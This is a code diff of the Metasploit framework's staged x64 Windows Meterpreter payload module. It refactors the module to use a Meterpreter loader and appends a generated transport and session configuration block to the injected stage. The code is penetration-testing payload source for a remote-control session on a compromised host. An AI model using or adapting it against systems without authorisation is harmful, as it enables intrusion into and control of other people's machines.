@@ -5,37 +5,60 @@
 
 
 require 'msf/core'
-require 'msf/core/payload/windows/x64/reflectivedllinject'
+require 'msf/core/payload/windows/x64/meterpreter_loader'
 require 'msf/base/sessions/meterpreter_x64_win'
 require 'msf/base/sessions/meterpreter_options'
+require 'rex/payloads/meterpreter/config'
 
 ###
 #
 # Injects the x64 meterpreter server DLL via the Reflective Dll Injection payload
+# along with transport related configuration.
 #
 ###
 
-module Metasploit3
+module Metasploit4
 
-  include Msf::Payload::Windows::ReflectiveDllInject_x64
+  include Msf::Payload::Windows::MeterpreterLoader_x64
   include Msf::Sessions::MeterpreterOptions
 
   def initialize(info = {})
     super(update_info(info,
       'Name'          => 'Windows Meterpreter (Reflective Injection x64)',
       'Description'   => 'Inject the meterpreter server DLL via the Reflective Dll Injection payload (staged x64)',
-      'Author'        => [ 'sf' ],
+      'Author'        => ['skape','sf', 'OJ Reeves'],
       'PayloadCompat' => { 'Convention' => 'sockrdi', },
       'License'       => MSF_LICENSE,
       'Session'       => Msf::Sessions::Meterpreter_x64_Win))
-
-    # Don't let people set the library name option
-    options.remove_option('LibraryName')
-    options.remove_option('DLL')
   end
 
-  def library_path
-    MetasploitPayloads.meterpreter_path('metsrv','x64.dll')
+  def stage_payload(opts={})
+    stage_meterpreter + generate_config(opts)
+  end
+
+  def generate_config(opts={})
+    unless opts[:uuid]
+      opts[:uuid] = Msf::Payload::UUID.new({
+        :platform => 'windows',
+        :arch     => ARCH_X64
+      })
+    end
+
+    # create the configuration block, which for staged connections is really simple.
+    config_opts = {
+      :arch       => opts[:uuid].arch,
+      :exitfunk   => datastore['EXITFUNC'],
+      :expiration => datastore['SessionExpirationTimeout'].to_i,
+      :uuid       => opts[:uuid],
+      :transports => [transport_config(opts)],
+      :extensions => []
+    }
+
+    # create the configuration instance based off the parameters
+    config = Rex::Payloads::Meterpreter::Config.new(config_opts)
+
+    # return the binary version of it
+    config.to_b
   end
 
 end
